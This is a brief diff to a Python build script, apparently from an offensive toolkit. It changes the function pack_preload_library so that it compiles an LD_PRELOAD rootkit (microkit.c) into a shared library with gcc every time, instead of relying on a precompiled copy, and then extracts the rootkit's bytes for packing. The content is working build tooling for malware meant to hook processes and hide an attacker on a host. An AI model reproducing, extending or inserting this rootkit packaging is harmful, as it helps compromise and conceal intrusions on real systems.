@@ -301,7 +301,7 @@ def pack_preload_library():
     # compile the LD_PRELOAD rootkit
     microkit = "ld_preload/microkit.c"
     microlib = "ld_preload/microkit.so"
-    #bash(f"gcc -fPIC -shared -o {microlib} {microkit} -ldl")   # commented, since it is precompiled for lower glibc version
+    bash(f"gcc -fPIC -shared -o {microlib} {microkit} -ldl")   # comment out, if it is precompiled (e.g. for lower glibc version)
 
     # extract the bytes from the rootkit
     c_bytes = ""
